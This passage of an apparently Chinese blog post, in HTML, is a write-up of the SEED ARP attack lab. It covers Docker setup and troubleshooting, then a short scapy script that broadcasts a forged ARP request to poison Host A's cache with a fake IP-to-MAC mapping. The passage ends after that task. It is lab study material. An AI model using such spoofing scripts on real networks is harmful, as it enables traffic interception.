@@ -1,0 +1,2238 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="很有收获的一门课">
+<title>ARP攻击原理学习</title>
+
+<link rel='canonical' href='https://th4uma.github.io/post/arp/'>
+
+<link rel="stylesheet" href="/scss/style.min.d22036d6184d552f391082a3351fac05082014cfcb6d5b996cf1dadf64fb01df.css"><meta property='og:title' content="ARP攻击原理学习">
+<meta property='og:description' content="很有收获的一门课">
+<meta property='og:url' content='https://th4uma.github.io/post/arp/'>
+<meta property='og:site_name' content='Thaumazein&#39;s Shelter'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-04-11T14:03:02&#43;08:00'/><meta property='article:modified_time' content='2026-04-11T14:03:02&#43;08:00'/><meta property='og:image' content='https://th4uma.github.io/images/cover/arp.jpg' />
+<meta name="twitter:title" content="ARP攻击原理学习">
+<meta name="twitter:description" content="很有收获的一门课"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://th4uma.github.io/images/cover/arp.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_3258497a308b47ee.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Thaumazein&#39;s Shelter</a></h1>
+            <h2 class="site-description">Keep on Keeping on!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/622057325'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <!--
+tags: [china, platform, streaming, video]
+category: Brand
+version: "2.1"
+unicode: "f6d2"
+-->
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  width="32"
+  height="32"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="#000000"
+  stroke-width="1"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" />
+  <path d="M8 3l2 3" />
+  <path d="M16 3l-2 3" />
+  <path d="M9 13v-2" />
+  <path d="M15 11v2" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Th4uma'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://psnprofiles.com/Thaumazein--'
+                        target="_blank"
+                        title="PSN"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 30 30" width="30px" height="30px">    <path d="M 11.181641 3.7421875 L 11.181641 24.857422 L 15.761719 26.257812 L 15.761719 8.5761719 C 15.761719 8.0671719 15.761625 7.8135937 16.015625 7.5585938 C 16.142625 7.3045937 16.396391 7.3046406 16.650391 7.4316406 C 17.286391 7.6856406 17.669922 8.1948906 17.669922 9.2128906 L 17.669922 16.207031 C 19.195922 16.970031 20.466375 16.970031 21.484375 16.207031 C 22.502375 15.444031 23.011719 14.300578 23.011719 12.392578 C 23.012719 10.357578 22.630234 9.0853594 21.740234 8.0683594 C 20.977234 7.0503594 19.578969 6.1594375 17.542969 5.5234375 C 14.998969 4.7604375 12.835641 4.1241875 11.181641 3.7421875 z M 9.9101562 16.972656 L 4.0585938 19.007812 L 3.1699219 19.388672 C 1.7709219 20.024672 1.0078125 20.660875 1.0078125 21.296875 C 1.1348125 22.059875 1.388875 23.078844 3.296875 23.714844 C 5.077875 24.350844 6.4770625 24.604891 10.039062 23.587891 L 10.039062 21.296875 C 6.6030625 22.440875 6.0949375 22.314547 5.5859375 22.060547 C 5.0769375 21.806547 5.076125 21.550828 5.203125 21.423828 C 5.585125 21.169828 6.984375 20.660156 6.984375 20.660156 L 9.9101562 19.642578 L 9.9101562 16.972656 z M 22.853516 17.962891 C 22.440109 17.948984 22.026781 17.956531 21.613281 17.988281 C 20.214281 17.988281 18.941063 18.243 17.414062 18.625 L 17.414062 21.296875 L 20.212891 20.277344 L 21.738281 19.769531 C 21.738281 19.769531 22.375812 19.642625 22.757812 19.515625 C 23.393812 19.388625 24.15625 19.642578 24.15625 19.642578 C 24.53825 19.642578 24.792969 19.768438 24.792969 20.023438 C 24.919969 20.277438 24.665297 20.406156 24.029297 20.660156 L 22.630859 21.169922 L 17.542969 23.076172 L 17.542969 25.748047 L 19.832031 24.984375 L 26.191406 22.695312 L 26.955078 22.3125 C 28.481078 21.8035 29.117234 21.167297 28.990234 20.404297 C 28.990234 19.642297 28.100219 19.134 26.574219 18.625 C 25.333719 18.24325 24.093734 18.004609 22.853516 17.962891 z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://qm.qq.com/q/86n1mKWhCE'
+                        target="_blank"
+                        title="QQ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-qq"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9.748a14.716 14.716 0 0 0 11.995 -.052c.275 -9.236 -11.104 -11.256 -11.995 .052z" /><path d="M18 10c.984 2.762 1.949 4.765 2 7.153c.014 .688 -.664 1.346 -1.184 .303c-.346 -.696 -.952 -1.181 -1.816 -1.456" /><path d="M17 16c.031 1.831 .147 3.102 -1 4" /><path d="M8 20c-1.099 -.87 -.914 -2.24 -1 -4" /><path d="M6 10c-.783 2.338 -1.742 4.12 -1.968 6.43c-.217 2.227 .716 1.644 1.16 .917c.296 -.487 .898 -.934 1.808 -1.347" /><path d="M15.898 13l-.476 -2" /><path d="M8 20l-1.5 1c-.5 .5 -.5 1 .5 1h10c1 0 1 -.5 .5 -1l-1.5 -1" /><path d="M13.75 7m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M10.25 7m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/page/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#准备">准备</a>
+      <ol>
+        <li><a href="#基本环境">基本环境</a></li>
+        <li><a href="#实验环境">实验环境</a></li>
+      </ol>
+    </li>
+    <li><a href="#任务一arp-缓存投毒">任务一：ARP 缓存投毒</a>
+      <ol>
+        <li><a href="#task-1aarp-request-进行缓存投毒">Task 1.A：ARP Request 进行缓存投毒</a></li>
+        <li><a href="#task-1barp-reply-投毒">Task 1.B：ARP Reply 投毒</a>
+          <ol>
+            <li><a href="#缓存中不存在ip">缓存中不存在IP</a></li>
+            <li><a href="#缓存中存在ip">缓存中存在IP</a></li>
+          </ol>
+        </li>
+        <li><a href="#task-1carp-无端报文">Task 1.C：<strong>ARP</strong> <strong>无端报文</strong></a>
+          <ol>
+            <li><a href="#缓存中不存在ip-1">缓存中不存在IP</a></li>
+            <li><a href="#缓存中存在ip-1">缓存中存在IP</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#任务二telnet-中间人攻击">任务二：Telnet 中间人攻击</a>
+      <ol>
+        <li><a href="#双向投毒">双向投毒</a></li>
+        <li><a href="#ip-转发">IP 转发</a></li>
+        <li><a href="#数据篡改">数据篡改</a></li>
+      </ol>
+    </li>
+    <li><a href="#任务三netcat-中间人攻击">任务三：Netcat 中间人攻击</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#arp-协议原理">ARP 协议原理</a></li>
+    <li><a href="#arp-缓存机制">ARP 缓存机制</a></li>
+    <li><a href="#安全问题">安全问题</a></li>
+    <li><a href="#arp-缓存中毒攻击">ARP 缓存中毒攻击</a></li>
+    <li><a href="#攻击效果">攻击效果</a></li>
+    <li><a href="#防御方法">防御方法</a></li>
+    <li><a href="#实验核心结论总结">实验核心结论总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/arp/">
+                
+                    <img src="/images/cover/arp.jpg" loading="lazy" alt="Featured image of post ARP攻击原理学习" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" >
+                计算机网络
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/arp/">ARP攻击原理学习</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            很有收获的一门课
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-04-11</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="准备">准备
+</h2><h3 id="基本环境">基本环境
+</h3><p>我使用的是Ubuntu 24.04.4 LTS 64位 的虚拟机</p>
+<ul>
+<li>CPU：4 核</li>
+<li>内存：8GB</li>
+<li>硬盘：50GB</li>
+<li>网络：NAT模式</li>
+</ul>
+<img src="1.png" style="width: 50%;" />
+<p>刷新系统包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt upgrade -y
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安装基础工具与docker依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">git</span> <span class="n">curl</span> <span class="n">net</span><span class="o">-</span><span class="n">tools</span> <span class="n">apt</span><span class="o">-</span><span class="n">transport</span><span class="o">-</span><span class="n">https</span> <span class="n">ca</span><span class="o">-</span><span class="n">certificates</span> <span class="n">software</span><span class="o">-</span><span class="n">properties</span><span class="o">-</span><span class="n">common</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>添加 Docker 的官方 GPG 密钥以确保下载的软件包安全</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o docker.gpg
+</span></span><span class="line"><span class="cl">sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg docker.gpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将 Docker 的稳定版仓库添加到 APT 源中，再次更新软件源以包含 Docker 仓库中的包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;deb [arch=</span><span class="k">$(</span>dpkg --print-architecture<span class="k">)</span><span class="s2"> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu </span><span class="k">$(</span>lsb_release -cs<span class="k">)</span><span class="s2"> stable&#34;</span> <span class="p">|</span> sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+</span></span><span class="line"><span class="cl">sudo apt update
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安装 Docker CE（社区版 ）、Docker CE CLI 和 Containerd</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install -y docker-ce docker-ce-cli containerd.io
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>启动 Docker 服务并设置为开机自启</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl start docker
+</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> docker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安装docker compose</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo apt install docker-compose-plugin
+</span></span><span class="line"><span class="cl"># 验证
+</span></span><span class="line"><span class="cl">docker compose version
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>遇到问题：验证时报错，没有显示docker版本</strong></p>
+<p>确认下载的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">head -n 5 /usr/local/bin/docker-compose
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显示Not Found，说明没有安装成功，卸载并重装</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo rm -f /usr/local/bin/docker-compose
+</span></span><span class="line"><span class="cl">sudo rm -f /usr/bin/docker-compose
+</span></span><span class="line"><span class="cl">sudo rm -f /bin/docker-compose
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h3 id="实验环境">实验环境
+</h3><p>使用 git 下载实验文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/seed-labs/seed-labs.git
+</span></span><span class="line"><span class="cl">cd seed-labs/category-network/ARP_Attack/Labsetup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>启动实验环境：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker compose up -d
+</span></span><span class="line"><span class="cl">sudo docker ps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>遇到问题：docker compose一切正常，但这里却报错<code>/usr/local/bin/docker-compose:行 1:Not:未找到命令</code></strong></p>
+<p>判断是因为命令指向旧路径，清理 hash 缓存</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hash -r
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>让 <code>docker-compose</code> 指向新版</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ln -s /usr/bin/docker /usr/local/bin/docker-compose
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>之后又报错：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">the</span><span class="w"> </span><span class="n">attribute</span><span class="w"> </span><span class="o">`</span><span class="n">version</span><span class="o">`</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">obsolete</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">ignored</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">remove</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">avoid</span><span class="w"> </span><span class="n">potential</span><span class="w"> </span><span class="n">confusion</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="n">unable</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="s1">&#39;handsonsecurity/seed-ubuntu:large&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="n">trying</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">unix</span><span class="p">:</span><span class="o">///</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="p">.</span><span class="n">sock</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断是执行权限不足，命令前加sudo解决</p>
+<img src="2.png" style="width: 100%;" />
+<p><strong>出现这个报错<code>the attribute </code>version<code> is obsolete, it will be ignored, please remove it to avoid potential confusion</code></strong></p>
+<p>是因为<code>docker-compose.yml</code> 文件中的 <code>version:</code> 字段在 Docker Compose v1.27.0+ 和 v2 中已经被弃用，不再需要指定，因此手动编辑删除即可</p>
+<img src="4.png" style="width: 100%;" />
+</blockquote>
+<p>记录三个主机：</p>
+<ul>
+<li>Host A：10.9.0.5</li>
+<li>Host B：10.9.0.6</li>
+<li>Attacker：10.9.0.105</li>
+</ul>
+<img src="3.png" style="width: 100%;" />
+<h2 id="任务一arp-缓存投毒">任务一：ARP 缓存投毒
+</h2><p>ARP 协议本身不具备认证机制，主机在接收到 ARP 报文时，会根据报文中的 IP-MAC 映射信息更新本地缓存，而不会验证该信息的真实性。这使得攻击者可以通过构造伪造报文实现缓存投毒</p>
+<h3 id="task-1aarp-request-进行缓存投毒">Task 1.A：ARP Request 进行缓存投毒
+</h3><blockquote>
+<p>实验目标：使 Host A 错误地将伪造 IP (10.9.0.99) 映射到攻击者指定的 MAC 地址</p>
+<p>方法：构造 ARP Request，广播伪造数据包</p>
+</blockquote>
+<p>进入容器 M</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it M-10.9.0.105 bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>切换到共享目录并创建攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /volumes
+</span></span><span class="line"><span class="cl">nano arp_request.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arp</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.99&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_request.py
+</span></span><span class="line"><span class="cl">./arp_request.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="5.png" style="width: 80%;" />
+<p>查看攻击者MAC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip addr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="6.png" style="width: 100%;" />
